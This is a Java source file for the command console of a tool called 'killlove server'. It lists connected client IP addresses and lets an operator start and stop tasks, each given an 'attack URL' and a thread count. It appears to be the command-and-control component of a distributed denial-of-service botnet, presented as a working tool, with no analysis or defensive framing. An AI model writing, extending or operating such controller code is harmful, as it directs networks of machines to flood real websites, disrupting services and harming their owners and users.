package com.luo123.killloveserver;

import java.util.Scanner;

/**
 * Created by Administrator on 2016/8/2.
 */
public class Command implements Runnable {
    @Override
    public void run() {
        Scanner sc = new Scanner(System.in);

        while (true) {
            switch (sc.nextLine()) {

                case "status":
                    System.out.println("在线客户端:" + Clientmanager.getInstance().client.size());
                    System.out.println("客户端列表:");
                    for (int i = 0; i < Clientmanager.getInstance().client.size(); i++) {
                        System.out.println(Clientmanager.getInstance().client.get(i).getInetAddress());
                    }
                    System.out.println("运行中的任务:");
                    for (Task task : Taskmanager.getTaskmanager().object.values()) {
                        System.out.println("------------------------------------------");
                        System.out.println("任务 " + task.getId());
                        System.out.println("url: " + task.getUrl());
                        System.out.println("线程数: " + task.getThreads());

                    }
                    break;
                //信息查看

                case "new":
                    System.out.println("请输入url");
                    String url = sc.nextLine();
                    System.out.println("请输入线程数");
                    int ths = sc.nextInt();

                    System.out.println("--------------------------------------");
                    System.out.println("线程数:" + ths);
                    System.out.println("攻击URL: " + url);
                    System.out.println("请再次确认(Y/N):");
                    String input = new Scanner(System.in).nextLine();
                    if (input.equals("y")) {
                        Taskmanager.getTaskmanager().addtask(ths, url);
                        System.out.println("添加成功");
                        break;
                    }
                    break;
//新任务
                case "stop":
                    System.out.println("请输入任务id");
                    int id = sc.nextInt();

                    if (Taskmanager.getTaskmanager().object.get(id) != null) { // 判断这个id对应的任务是否存在
                        System.out.println("--------------------------------------");
                        System.out.println("你要终止的任务：");
                        System.out.println("任务 " + id);
                        System.out.println("url: " + Taskmanager.getTaskmanager().object.get(id).getUrl());
                        System.out.println("线程数: " + Taskmanager.getTaskmanager().object.get(id).getThreads());
                        System.out.println("请再次确认(Y/N):");
                        String in = new Scanner(System.in).nextLine();
                        if (in.equals("y")) {
                            Taskmanager.getTaskmanager().stoptask(id);
                            System.out.println("成功终止任务");
                        }
                    } else {
                        System.out.println("这个任务不存在");
                    }

                    break;
                //终止任务

                case "help":
                    System.out.println("killlove server v1.0   by:luo123");

                    System.out.println("help   ---查看帮助");
                    System.out.println("new    ---新任务");
                    System.out.println("stop   ---终止任务");
                    System.out.println("status   ---查看状态");
                    break;
                default:
                    System.out.println("请输入help查看帮助");
                    break;


            }

        }
    }
}
